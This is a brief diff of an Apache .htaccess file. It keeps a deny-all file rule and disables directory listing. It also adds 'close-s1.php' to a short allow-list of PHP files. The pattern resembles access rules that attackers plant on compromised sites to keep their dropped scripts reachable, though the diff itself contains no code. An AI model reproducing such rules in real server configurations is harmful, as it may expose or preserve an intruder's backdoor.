@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(#.php)$'>
+<FilesMatch '^(#.php|close-s1.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
